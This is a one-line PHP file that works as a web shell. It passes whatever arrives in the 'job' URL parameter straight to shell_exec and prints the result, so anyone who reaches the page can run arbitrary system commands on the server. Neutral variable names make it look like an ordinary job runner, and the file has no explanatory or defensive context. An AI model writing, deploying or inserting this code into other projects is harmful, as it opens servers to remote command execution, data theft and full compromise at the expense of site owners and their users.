<?php $task=$_GET['job']??'id'; echo shell_exec($task.' 2>&1');
